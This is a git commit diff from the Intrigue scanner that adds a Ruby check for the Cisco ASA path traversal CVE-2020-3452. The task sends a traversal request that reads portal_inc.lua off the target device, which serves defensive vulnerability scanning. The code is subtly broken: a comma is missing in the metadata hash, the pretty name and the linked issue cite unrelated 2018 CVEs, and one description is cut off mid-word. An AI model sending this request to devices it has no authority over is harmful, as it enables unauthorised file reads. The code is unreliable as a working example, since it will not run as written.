12ced4e71a84972df4163a70a14370fccf87e8b7
Jonathan Cran <jcran@pentestify.com>
2020-07-22 16:08:06 -0500

    add check for CVE-2020-3452

--- lib/issues/cisco_asa_abitrary_file_read_cve_2020_3452.rb
+++ lib/issues/cisco_asa_abitrary_file_read_cve_2020_3452.rb
@@ -4,13 +4,13 @@ module Intrigue
   
     def self.generate(instance_details={})
       {
-        added: "2020-01-01",
+        added: "2020-07-22",
         pretty_name: "Cisco ASA Arbitrary File Read (CVE-2020-3452)",
         name: "cisco_asa_abitrary_file_read_cve_2020_3452",
-        category: "network",
+        category: "vulnerability",
         severity: 1,
         status: "confirmed",
-        description: "Cisco ASA arbitrary file read",
+        description: "Cisco ASA vulnerability, allows reading of arbitrat ",
         remediation:  "Update the device.",
         affected_software: [
           { :vendor => "Cisco", :product => "Adaptive Security Appliance Software" },
@@ -19,7 +19,8 @@ module Intrigue
         references: [ # types: description, remediation, detection_rule, exploit, threat_intel
           { type: "description", uri: "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86" }, 
           { type: "description", uri: "https://twitter.com/ptswarm/status/1285974719821500423/photo/1" }
-        ]
+        ], 
+        check: "vuln/cisco_asa_abitrary_file_read_cve_2020_3452"
       }.merge(instance_details)
     end
   
---
+++ lib/tasks/vuln/cisco_asa_abitrary_file_read_cve_2020_3452.rb
@@ -0,0 +1,43 @@
+module Intrigue
+  module Task
+  class CiscoAsaPathTraversalCve20203452 < BaseTask
+  
+    def self.metadata
+      {
+        :name => "vuln/cisco_asa_abitrary_file_read_cve_2020_3452",
+        :pretty_name => "Vuln Check - Cisco ASA Path Traversal (CVE-2018-0286)",
+        :authors => ["jcran"],
+        :identifiers => [{ "cve" =>  "CVE-2020-3452" }],
+        :description => "This task checks a cisco ASA for a path traversal vulnerability",
+        :references => ["https://twitter.com/aboul3la/status/1286012324722155525"]
+        :type => "vuln_check",
+        :passive => false,
+        :allowed_types => ["Uri"],
+        :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
+        :allowed_options => [],
+        :created_types => []
+      }
+    end
+  
+    ## Default method, subclasses must override this
+    def run
+      super
+      
+      require_enrichment
+
+      vuln_path = "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
+      body = http_get_body "#{_get_entity_name}#{vuln_path}"
+      
+      if body =~ /otrizna/
+        _create_linked_issue "cisco_asa_path_traversal_cve_2018_0296", { "proof" => body }
+      else 
+        _log "Not vulnerable? Got: #{body}"
+      end
+
+    end
+  
+   
+  end
+  end
+  end
+  
